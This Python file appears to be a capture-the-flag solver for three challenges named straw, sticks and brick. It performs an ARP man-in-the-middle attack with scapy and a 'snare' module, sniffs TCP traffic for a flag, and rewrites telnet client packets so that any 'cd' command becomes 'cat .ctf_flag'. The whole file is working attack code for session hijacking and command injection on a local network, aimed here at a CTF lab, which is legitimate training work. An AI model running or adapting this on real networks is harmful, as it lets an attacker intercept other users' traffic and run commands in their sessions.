# coding: utf-8
import logging
import re
import scapy.all as scapy
import snare
import strategy

logger = logging.getLogger(__name__)

class Strategy(strategy.Strategy):
    """
    This strategy solves the three piggies challenges (straw, sticks, brick) by injecting a command into the TCP stream
    Straw and sticks can be solved in "easier" ways, but this Strategy works for all three
    """
    name = "inject command into TCP stream"
    needsip = True
    challenges = ['straw', 'sticks', 'brick']

    class AnalysisModule(snare.Module):
        """AnalysisModule looks at any TCP packet with a payload for the flag and stops the sniffer when it is found"""
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.flag = None
            self.sniffer = None

        def start(self, sniffer):
            self.sniffer = sniffer

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
                logger.debug(pkt.sprintf('%IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %Raw.load%'))

                try:
                    load = pkt.load.decode('utf-8')
                except UnicodeDecodeError:
                    return

                m = re.search(self.flagpattern, load)
                if m:
                    self.flag = m.group(0)
                    self.sniffer.stop()

    @snare.tcpfilter
    @staticmethod
    def injectcmd(pkt):
        """injectcmd looks for a telnet client packet and if it has the `cd` command, reaplces it with `cat .ctf_flag`"""
        if all(layer in pkt for layer in (scapy.IP, scapy.TCP)):
            if scapy.Raw in pkt and pkt[scapy.TCP].dport == 23:
                raw = pkt[scapy.Raw]
                if b'cd ' in raw.load:
                    raw.load = b'cat .ctf_flag\n'
        return pkt

    def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
        sniffer = snare.Sniffer(iface=iface)
        analyser = self.AnalysisModule(flagpattern)
        sniffer.register(
            analyser,
            snare.ArpMitmModule(filter=self.injectcmd)
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return analyser.flag
